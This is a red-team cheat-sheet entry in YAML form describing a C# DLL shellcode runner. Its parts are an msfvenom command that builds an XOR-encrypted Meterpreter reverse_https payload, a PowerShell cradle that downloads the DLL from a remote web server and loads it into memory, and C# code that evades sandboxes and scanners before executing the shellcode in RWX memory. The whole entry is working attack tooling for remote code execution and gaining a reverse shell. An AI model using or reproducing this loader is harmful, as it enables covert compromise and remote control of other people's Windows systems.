---
description: |
  Shellrunner in managed DLL, with the below code you can create a DLL that hold an meterpreter shell. Host this DLL on your webserver and retrieve it via the second part of the code, which makes sure the DLL is directly loaded into the memory of the Windows machine.

  Command Reference:

  	byte[] buf: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a


command: |
    $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.21/ShellcodeRunner.dll')

    $assem = [System.Reflection.Assembly]::Load($data)
    or (for local file)
    $assem = [System.Reflection.Assembly]::LoadFile("C:\user\documents\ClassLibrary1.dll")

    $class = $assem.GetType("ShellcodeRunner.Program")
    $method = $class.GetMethod("Run")
    $method.Invoke(0, $null)
    Or
    $a = [ShellcodeRunner.Program]::Run()
    ```

code: |
    using System;
    using System.Runtime.InteropServices;

    namespace ShellcodeRunner
    {
        public class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll")]
            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

            [DllImport("kernel32.dll")]
            static extern void Sleep(uint dwMilliseconds);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

            [DllImport("kernel32.dll")]
            static extern IntPtr GetCurrentProcess();

            public static void Run()
            {
                // Check if we're in a sandbox by calling a rare-emulated API
                if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
                {
                    return;
                }

                // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
                var rand = new Random();
                uint dream = (uint)rand.Next(10000, 20000);
                double delta = dream / 1000 - 0.5;
                DateTime before = DateTime.Now;
                Sleep(dream);
                if (DateTime.Now.Subtract(before).TotalSeconds < delta)
                {
                    Console.WriteLine("Charles, get the rifle out. We're being fucked.");
                    return;
                }

                // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
                byte[] buf = new byte[657] {0x9d,0x29,0xe2, [...]
                                ,0x9e,0xb4};

                // XOR-decrypt the shellcode
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)(buf[i] ^ (byte)'a');
                }

                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
                Marshal.Copy(buf, 0, addr, buf.Length);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }
    }


items:
    - Shell
services:
    - 
OS:
    - Windows
attack_types:
    - Persistence
    - Injection
references:
    - https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/shellcode-runners#c-dll-with-powershell-cradle-in-memory
--- 


